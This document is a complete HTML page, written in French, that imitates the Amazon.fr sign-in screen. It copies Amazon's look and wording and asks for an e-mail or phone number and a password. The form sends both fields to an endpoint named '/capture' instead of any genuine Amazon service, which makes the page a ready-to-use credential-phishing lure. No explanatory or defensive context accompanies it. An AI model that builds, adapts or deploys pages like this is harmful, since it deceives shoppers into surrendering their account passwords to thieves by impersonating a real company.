<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon.fr Connexion</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f3f3f3;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: white;
            border-radius: 4px;
            max-width: 350px;
            width: 100%;
            padding: 30px;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 28px;
            font-weight: 400;
            margin-bottom: 10px;
        }
        .subtitle {
            color: #333;
            margin-bottom: 20px;
            font-weight: 400;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #333;
            font-weight: 700;
            font-size: 13px;
        }
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 8px;
            border: 1px solid #a6a6a6;
            border-radius: 3px;
            font-size: 13px;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            border-color: #e77600;
            box-shadow: 0 0 3px 2px rgba(228,121,17,.5);
        }
        .btn {
            width: 100%;
            padding: 10px;
            background: #f0c14b;
            color: #333;
            border: 1px solid #a88734;
            border-radius: 3px;
            font-size: 13px;
            cursor: pointer;
            font-weight: 400;
        }
        .btn:hover {
            background: #edb931;
        }
        .help {
            font-size: 12px;
            margin-top: 15px;
        }
        .help a {
            color: #0066c0;
            text-decoration: none;
        }
        .help a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1 style="color: #232f3e;">Amazon</h1>
        </div>
        <h1>S'identifier</h1>
        
        <form action="/capture" method="POST">
            <div class="form-group">
                <label for="email">E-mail ou numéro de téléphone portable</label>
                <input type="email" name="email" id="email" required>
            </div>
            <div class="form-group">
                <label for="password">Mot de passe</label>
                <input type="password" name="password" id="password" required>
            </div>
            <button type="submit" class="btn">Continuer</button>
        </form>
        
        <div class="help">
            <a href="#">Besoin d'aide ?</a>
        </div>
    </div>
</body>
</html>
